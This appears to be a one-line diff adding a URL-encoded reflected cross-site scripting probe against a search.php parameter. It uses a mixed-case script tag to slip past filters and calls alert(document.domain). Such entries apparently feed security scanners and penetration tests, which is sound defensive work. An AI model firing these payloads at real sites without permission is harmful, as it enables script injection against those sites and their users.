@@ -1,0 +1,1 @@
+/search.php?q=%3CScRipT%3Ealert(document.domain);%3C/ScRipT%3E
